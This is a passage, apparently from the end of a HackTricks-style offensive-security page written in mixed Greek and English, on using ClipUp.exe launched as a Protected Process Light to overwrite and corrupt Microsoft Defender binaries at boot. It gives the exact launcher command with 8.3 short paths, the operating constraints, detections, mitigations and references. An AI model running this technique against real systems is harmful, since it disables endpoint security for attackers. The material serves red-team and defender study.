```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp πέρα από τη θέση· το primitive είναι κατάλληλο για αλλοίωση παρά για ακριβή έγχυση περιεχομένου.
- Απαιτεί τοπικά δικαιώματα admin/SYSTEM για την εγκατάσταση/εκκίνηση μιας υπηρεσίας και παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά το boot αποφεύγει κλειδώματα αρχείων.

Detections
- Process creation of `ClipUp.exe` with unusual arguments, especially parented by non-standard launchers, around boot.
- Νέες υπηρεσίες ρυθμισμένες να auto-start ύποπτα binaries και που ξεκινούν σταθερά πριν το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από τις αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων στα Defender binaries/Platform directories· απρόσμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- ETW/EDR telemetry: look for processes created with `CREATE_PROTECTED_PROCESS` and anomalous PPL level usage by non-AV binaries.

Mitigations
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να τρέξουν ως PPL και υπό ποιους parents· μπλοκάρετε την κλήση του ClipUp εκτός νόμιμων συμφραζομένων.
- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start υπηρεσιών και παρακολουθήστε χειρισμούς της σειράς εκκίνησης.
- Βεβαιώστε ότι το Defender tamper protection και οι early-launch protections είναι ενεργοποιημένα· ερευνήστε σφάλματα εκκίνησης που υποδεικνύουν φθορά binaries.
- Σκεφτείτε να απενεργοποιήσετε τη δημιουργία 8.3 short-name σε volumes που φιλοξενούν security tooling αν είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
